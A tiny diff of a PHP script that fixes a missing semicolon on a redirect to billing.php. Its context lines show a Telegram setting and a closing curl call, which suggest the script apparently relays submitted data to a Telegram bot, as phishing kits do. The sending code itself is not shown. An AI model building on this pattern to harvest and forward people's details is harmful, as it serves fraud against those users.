@@ -64,6 +64,6 @@ if ($settings['telegram'] == "1"){
   curl_close($ch);
 }
 
-header('Location: billing.php')
+header('Location: billing.php');
 
 ?>
